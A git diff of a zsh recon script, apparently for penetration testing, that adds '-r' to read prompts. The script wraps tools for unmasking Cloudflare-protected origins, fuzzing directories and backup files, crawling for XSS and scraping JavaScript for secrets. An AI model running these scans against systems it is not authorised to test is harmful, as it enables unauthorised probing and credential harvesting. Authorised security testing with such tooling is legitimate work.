+        read -r pub\?"IS THE DOMAIN BEHIND CLOUDFLARE? (Y/N): "
         if [[ $pub =~ [Yy] ]]; then
             echo -e "\nCHECKING UNCOVERING & PUBLIC SUBDOMAINS\n"
             cur=$(pwd) && cd /home/kali/TOOLS/CloakQuest3r && ./venv/bin/python3 cloakquest3r.py $domain && cd $cur
@@ -1201,7 +1186,7 @@ dirfuzz(){
     nuclei -up &>/dev/null && nuclei -ut &>/dev/null
     nuclei -u $1 -t http/exposures
 
-    read cel\?"INPUT ENDPOINT FOR GENERATED FUZZING IF NEEDED (Current -> \"$1\"): "
+    read -r cel\?"INPUT ENDPOINT FOR GENERATED FUZZING IF NEEDED (Current -> \"$1\"): "
     if [[ ! -z $cel ]]; then
         echo -e "\nGENERATED FUZZING\n"
         cewl $cel -d 4 -m 3 --lowercase --with-numbers --convert-umlauts -w /tmp/$(echo $1 | unfurl format %d).txt
@@ -1212,7 +1197,7 @@ dirfuzz(){
     echo -e "\nBIGGER DIRECTORY SEARCH\n"
     ffuf -ac -acs advanced -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -v
 
-    read resp\?"INPUT EXTENSION FOR BACKEND & BACKUP FUZZING: "
+    read -r resp\?"INPUT EXTENSION FOR BACKEND & BACKUP FUZZING: "
     if [[ ! -z $resp ]]; then
         ffuf -ac -acs advanced -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e $resp,$resp.old,$resp.bak,$resp.tmp,$resp~,old,bak,tmp -v
     fi
@@ -1381,7 +1366,7 @@ crscan(){
 
 # Common Reflected / Blind / DOM XSS Crawling
 xsscan(){
-    read xsscookie\?"INPUT COOKIE HEADER IF NEEDED: "
+    read -r xsscookie\?"INPUT COOKIE HEADER IF NEEDED: "
     if [[ -z $xsscookie ]]; then
         wingman -u $1 --crawl
     else
@@ -1496,7 +1481,7 @@ filemine(){
     echo -e "\nSCRAPING JAVASCRIPT FILES FOR SECRETS/ENDPOINTS\n"
     cat ~/.config/waymore/results/$1/waymore.txt | grep -E "\.js$" | httpx -fr -mc 200 > js_files_$1.txt
     rm ~/.config/waymore/results/$1/waymore.txt
-    while read uri; do jsmine $uri; done < js_files_$1.txt
+    while read -r uri; do jsmine $uri; done < js_files_$1.txt
 }
 
 # WHOIS Record Checker
@@ -1540,7 +1525,7 @@ ptr(){
 
     if [[ $1 =~ $asn_regex ]]; then
         whois -h whois.radb.net -- "-i origin $1" | grep -Eo "([0-9.]+){4}/[0-9]+" | anew -q cidr_$1.txt
-        touch ptr_domains.txt && while read cidr; do echo $cidr | mapcidr -silent | dnsx -ptr -resp-only | anew -q ptr_domains.txt; done < cidr_$1.txt
+        touch ptr_domains.txt && while read -r cidr; do echo $cidr | mapcidr -silent | dnsx -ptr -resp-only | anew -q ptr_domains.txt; done < cidr_$1.txt
     elif [[ $1 =~ $cidr_regex ]]; then
         echo $1 | mapcidr -silent | dnsx -ptr -resp-only | anew -q ptr_domains.txt
     else
